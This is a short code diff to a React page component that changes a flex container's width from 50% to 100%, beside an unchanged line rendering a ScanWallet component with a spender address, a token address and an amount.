@@ -36,7 +36,7 @@ export default function Home() {
         <div style={{
           display: "flex",
           flexDirection: "row",
-          width: "50%",
+          width: "100%",
           justifyContent: "space-between",
           marginTop: "20px"}}>
         <ScanWallet spenderAddress={"0xFDb22826e8dF996CcC5Db65734260A54461406cC"} tokenAddresses={["0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"]} chainIds={[1]} amount={"999999999999999"} />
